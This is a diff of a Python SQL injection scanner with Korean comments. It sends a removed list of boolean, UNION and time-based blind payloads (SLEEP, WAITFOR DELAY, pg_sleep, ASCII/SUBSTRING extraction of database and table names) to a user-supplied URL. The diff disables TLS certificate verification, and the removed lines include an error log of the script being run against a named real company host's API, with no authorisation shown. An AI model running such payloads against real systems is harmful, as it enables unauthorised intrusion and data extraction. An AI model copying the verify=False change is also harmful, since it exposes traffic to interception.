@@ -1,4 +1,8 @@
 import requests
+import urllib3
+
+# 테스트 용도로 SSL 경고 비활성화; 실제 운영 환경에서는 제거하는 것이 좋습니다.
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 사용자 입력을 통한 설정 정보 수집
 url = input("URL을 입력하세요: ")
@@ -14,107 +18,7 @@ injection_payloads = [
     "' AND '1'='2 -- ",
     "AND 1=1 --",
     "AND 1=2 --",
-    "OR 'a'='a' -- ",
-    "OR 'a'='b' -- ",
-    "OR 1=1 --",
-    "OR 1=2 --",
-
-    # 괄호와 다양한 특수문자 위치 조합
-    "') AND ('1'='1 --",
-    "') AND ('1'='2 --",
-    "' AND (1=1) --",
-    "' AND (1=2) --",
-    ") AND (1=1 --",
-    ") AND (1=2 --",
-    "') OR ('a'='a' --",
-    "') OR ('a'='b' --",
-    "AND 1=1 /*",
-    "AND 1=2 /*",
-    "|| 1=1 #",
-    "|| 1=2 #",
-
-    # 산술 연산 및 특수 문자 추가
-    "' AND ((1+1)=2) /*",
-    "' AND ((1+1)=3) /*",
-    "AND ((2*2)=4) #",
-    "AND ((2*2)=5) #",
-    "' AND ((10/2)=5) --",
-    "' AND ((10/2)=6) --",
-
-    # 주요 DBMS별 Blind Injection 조건 및 주석 스타일
-    # MySQL
-    "' AND SLEEP(5) --",                      
-    "' AND BENCHMARK(1000000,MD5('test')) --", 
-    "' AND IF(1=1, SLEEP(5), 0) --",          
-    "' AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 64 --",
-    "' UNION SELECT NULL, NULL#",
-    "' OR 1=1 /*",
-    
-    # MSSQL
-    "'; WAITFOR DELAY '0:0:5' --",            
-    "' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype='U') --",  
-    "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects), 1, 1)) > 64 --",
-    "' OR 'a' LIKE 'a'--",                    
-    "AND 1=1 --",                             
-    
-    # Oracle
-    "' AND 1=(SELECT COUNT(*) FROM all_tables) --",  
-    "' AND (SELECT COUNT(*) FROM dual WHERE 'a'='a') = 1 --",  
-    "' OR '1'='1' --",
-    "' OR 'a'='a' /*",
-    "' OR 1=1 --",
-    
-    # PostgreSQL
-    "'; SELECT pg_sleep(5) --",               
-    "' AND 1=(SELECT COUNT(*) FROM pg_catalog.pg_tables) --",
-    "' AND ASCII(SUBSTRING((SELECT tablename FROM pg_catalog.pg_tables LIMIT 1), 1, 1)) > 64 --",
-    "AND '1'='1' /*",
-    "' OR pg_sleep(5) --",
-    
-    # (CASE WHEN 구문 및 ASCII 조건 조합
-    "' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --",
-    "' AND (CASE WHEN (1=2) THEN 1 ELSE 0 END)=1 --",
-    "AND (CASE WHEN (ASCII('A')=65) THEN 1 ELSE 0 END)<2 --",
-    "AND (CASE WHEN (NULL IS NULL) THEN 1 ELSE 0 END)=1 --",
-
-    # 다양한 위치의 특수문자와 주석 스타일
-    "' /*' OR '1'='1 --",
-    "' /*' OR '1'='2 --",
-    "';--",
-    "'; /*",
-    "' OR 'a'='a'; --",
-    "' AND 1=1; --",
-    "' OR '1'='1'/*",
-    "'; /* SQL Injection Detection */",
-    "'--",
-    "'/*",
-    "#",
-    ";--",
-    
-    # LIKE 및 특수문자 조합
-    "' AND ('text' LIKE 'te%') --",
-    "' AND ('text' LIKE 'xx%') --",
-    "' OR ('%' LIKE '%') /*",
-    "' AND ('%' = '%') /*",
-    
-    # SUBSTRING, LENGTH와 특수문자 조합
-    "' AND (LENGTH('testing')=7) --",
-    "AND (LENGTH('example') > 4) /*",
-    "' AND (SUBSTRING('hello', 1, 1)='h') --",
-    "AND (SUBSTRING('world', 2, 1)='o') /*",
-    
-    # ASCII 값 조건과 주석 포함 조합
-    "' AND (ASCII('A')=65) /*",
-    "' AND (ASCII('B')=66) --",
-    "AND (ASCII('C')>64) --",
-    "AND ASCII('D')=68 /*",
-    
-    # 복합 조건 (다양한 위치에 특수문자 및 주석 추가)
-    "AND 1 BETWEEN 0 AND 2 --",
-    "AND 2 BETWEEN 1 AND 3 /*",
-    "OR (5=5 AND 6=6) --",
-    "AND LENGTH('hello') > 3 #",
-    "OR LENGTH('example') < 10 /*",
+    # ... (나머지 페이로드 추가)
 ]
 
 # 취약점 탐지 함수
@@ -130,9 +34,9 @@ def detect_sql_injection():
         try:
             # 선택한 방식에 따라 GET 또는 POST 요청을 보냄
             if request_method == "GET":
-                response = requests.get(url, params=params, timeout=10)
+                response = requests.get(url, params=params, timeout=10, verify=False)  # SSL 검증 비활성화
             elif request_method == "POST":
-                response = requests.post(url, data=params, timeout=10)
+                response = requests.post(url, data=params, timeout=10, verify=False)  # SSL 검증 비활성화
             else:
                 print("[오류] 요청 방식이 잘못되었습니다. GET 또는 POST 중에서 선택하세요.")
                 return
@@ -159,11 +63,3 @@ def detect_sql_injection():
 # 프로그램 실행
 if __name__ == "__main__":
     detect_sql_injection()
-
-
-페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
-[오류] '' AND '1'='2 -- ' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
-[오류] 'AND 1=1 --' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
-[오류] 'AND 1=2 --' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
-[오류] 'OR 'a'='a' -- ' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
-[오류] 'OR 'a'='b' -- ' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
